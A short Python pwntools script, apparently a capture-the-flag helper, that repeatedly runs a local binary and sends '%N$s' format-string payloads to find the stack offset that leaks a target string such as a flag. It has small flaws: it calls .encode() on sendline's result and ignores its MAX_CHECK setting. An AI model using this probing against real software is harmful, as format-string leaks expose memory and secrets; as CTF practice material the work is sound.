#!/usr/bin/env python3
# *~ author: @TheFlash2k

from pwn import *

context.log_level = 'error'
''' Set this to a string you want to check for. '''
STR_TO_CHECK = None

''' Set this to the binary you want to brute-force '''
exe = "CHANGE_THIS"

''' Set this to the max checks you want to run '''
MAX_CHECK = 100

''' Set this to the format specifier s by default.
Example: %10$s '''
SPECIFIER = 's'

for i in range(1, 100):
	try:
		io = process(exe)
		io.sendline(f"%{i}${SPECIFIER}").encode()
		buf = io.recv() # You can change this to match your usecase
		if STR_TO_CHECK:
			if STR_TO_CHECK in buf.decode('latin-1'):
				print(f"[*] Found flag at offset {i}\n{buf}")
				exit(0)
		print(i, buf)
	except: pass